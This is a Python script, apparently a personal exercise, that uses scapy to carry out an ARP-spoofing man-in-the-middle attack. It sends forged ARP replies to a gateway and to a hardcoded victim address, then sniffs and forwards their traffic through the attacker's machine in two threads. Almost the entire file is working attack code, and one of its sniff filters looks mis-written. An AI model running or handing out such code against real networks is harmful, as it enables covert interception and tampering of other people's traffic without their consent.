# send the gw arp replies in intervals: 
# send the victim arp replies in intevals:
 
 
# thread1 is intercepting info from gw to victim
# thread2 is forwarding info from victim tp gw
 
# data from gw to victim: should change "src" value to my MAC
# data from victim to gw: should change dest value to me.
 
# testing: 
# 1. sniff with wireshark and see if I (as an attacker) see my MAC in the icmp messages(pings)
# that were adressed to the victim ip.
 
import scapy.all as scapy
import datetime
import time
import threading
 
 
def ArpReplyGen(spoofed_ip, attack_mac, tgt_mac, tgt_ip):
    arp_packet = scapy.Ether() / scapy.ARP()
    arp_packet[scapy.ARP].psrc = spoofed_ip
    arp_packet[scapy.ARP].hwsrc = attack_mac
    arp_packet[scapy.ARP].pdst = tgt_ip
    arp_packet[scapy.ARP].hwdst = tgt_mac
    arp_packet[scapy.ARP].op = 2
 
    return arp_packet
 
 # thread1 is intercepting info from gw to victim
# thread2 is forwarding info from victim tp gw
 
def gw_to_victim_handler(packet,default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip):
    packet[scapy.Ether].dst = victim_mac
    packet[scapy.Ether].src = attack_mac
    scapy.sendp(packet)
 
def gw_to_victim(default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    scapy.sniff(filter = f"dst host {victim_ip} and src host {gw_ip}",prn=lambda packet: \
                gw_to_victim_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac\
                                      , victim_ip),timeout=seconds_to_run)
 
def victim_to_gw_handler(packet,default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip):
    packet[scapy.Ether].dst = default_gw_mac
    packet[scapy.Ether].src = attack_mac
    scapy.sendp(packet)
    
def victim_to_gw(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    scapy.sniff(filter = f"dst host {victim_ip} and src host {default_gw_mac} and not ether src {attack_mac}", prn=lambda packet: \
                victim_to_gw_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip), \
                    timeout=seconds_to_run)
 
def ArpSpoofer(victim_ip, seconds_to_run):
    gw_ip = scapy.conf.route.route("0.0.0.0")[2]
    attack_mac = scapy.Ether().src
    victim_mac = scapy.getmacbyip(victim_ip) 
    default_gw_mac = scapy.getmacbyip(gw_ip)
 
    arp_response_packet_victim = ArpReplyGen(gw_ip,attack_mac,victim_mac,victim_ip)
    arp_response_packet_gw = ArpReplyGen(victim_ip,attack_mac,default_gw_mac,gw_ip)
 
    time_start = datetime.datetime.now()
 
    t1 = threading.Thread(target=gw_to_victim, args=(default_gw_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
    t2 = threading.Thread(target=victim_to_gw, args=(default_gw_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
 
    t1.start()
    t2.start()
 
    while (datetime.datetime.now()-time_start).total_seconds() < seconds_to_run:
        time.sleep(5)
        scapy.sendp(arp_response_packet_victim)
        scapy.sendp(arp_response_packet_gw)
 
    t1.join()
    t2.join()
 
 
ArpSpoofer("192.168.1.28",55)